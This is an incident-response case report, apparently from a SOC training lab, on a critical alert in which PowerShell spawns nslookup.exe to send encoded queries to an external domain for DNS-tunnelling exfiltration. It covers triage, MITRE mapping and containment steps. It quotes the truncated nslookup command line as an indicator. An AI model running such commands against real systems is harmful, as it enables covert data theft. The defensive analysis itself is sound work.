# Alert 1025 Case Report - Active Data Exfiltration via DNS Tunneling (nslookup.exe)

Active Data Exfiltration via DNS Tunneling (nslookup.exe)

## 1. Executive Summary
* **Classification:** True Positive
* **Severity:** Critical
* **Escalation Required:** Yes
* **Timestamp:** `09/07/2026 18:09:34.240`
* **Summary:** A Critical True Positive incident was identified on host `win-3450` (belonging to Michael Ascot) involving active data exfiltration and C2 beaconing. The compromised PowerShell process (PID: 3728) spawned `nslookup.exe` directly out of the staged exfiltration directory to send heavily encoded query strings to an external domain (`h4z4rdw4re.io`) via DNS tunneling.

---

## 2. Affected Entities & Host Details
* **Source Host:** `win-3450`
* **User Account:** `michael.ascot` (Michael Ascot)
* **Target Domain:** `h4z4rdw4re.io`

---

## 3. Indicators & Process Artifacts
* **Parent Process:** `powershell.exe` (PID: 3728)
* **Child Process:** `nslookup.exe` (PID: 5570)
* **Working Directory:** `C:\Users\michael.ascot\downloads\exfiltration`
* **Command Line:** `"C:\Windows\system32\nslookup.exe" U2FsdGVkX19...h4z4rdw4re.io`
* **Event Code:** Sysmon Event ID 1 (Process Create)
* **MITRE ATT&CK Mapping:** T1059.001 (Command and Scripting Interpreter: PowerShell), T1071.004 (Application Layer Protocol: DNS), T1132.001 (Data Encoding: Standard Encoding), T1048.003 (Exfiltration Over Alternative Protocol)
* **Malicious Indicators:** Native administrative utility (`nslookup.exe`) executing from a local staging directory with high-entropy/encoded subdomains directed at an untrusted external domain.

---

## 4. Triage & Analysis

**True Positive Justification:**
Sysmon Event ID 1 (Process Creation) records `powershell.exe` spawning `"C:\Windows\system32\nslookup.exe" U2FsdGVkX19...h4z4rdw4re.io` directly out of the staged exfiltration directory (`C:\Users\michael.ascot\downloads\exfiltration`). Abusing native Windows utilities (`nslookup.exe`) to issue requests with heavily encoded payloads directed at an external domain is a classic DNS tunneling technique used for stealthy data exfiltration and C2 communications.

**Escalation Justification:**
Critical escalation is required. This activity confirms active data exfiltration following the collection and staging phases (ALT-28, ALT-29). DNS tunneling intentionally leverages ubiquitous UDP port 53 traffic to bypass standard web proxies and perimeter firewalls. Immediate host containment and domain-level blocking are vital to halt ongoing data exfiltration.

---

## 5. Resolution & Actions
1. **Immediate Isolation & Process Termination:** Network-isolate host `win-3450` immediately to halt DNS tunneling activity. Terminate parent process `powershell.exe` (PID: 3728) and child process `nslookup.exe` (PID: 5570).
2. **Perimeter & DNS Defense:** Block the destination domain (`h4z4rdw4re.io`) and associated IP infrastructure at the internal DNS resolvers, DNS firewall, and perimeter security controls.
3. **Identity Remediation:** Revoke Active Directory domain credentials and invalidate all active session tokens for user `michael.ascot`.
4. **Forensic Impact Assessment:** Query internal DNS resolver logs for all query strings ending in `.h4z4rdw4re.io` to measure total payload volume, exfiltration scope, and exact duration. Conduct a deep forensic analysis of `C:\Users\michael.ascot\downloads\exfiltration` to identify what sensitive files were encoded and exfiltrated.

## 6. Screenshots
<img width="2559" height="1387" alt="ALT-1025-Log" src="https://github.com/user-attachments/assets/c1c5b7cb-b388-46ca-a954-178c804777d9" />
<img width="2560" height="1392" alt="ALT-1025" src="https://github.com/user-attachments/assets/2cbb3084-347b-461e-a544-5ec69e35ed15" />
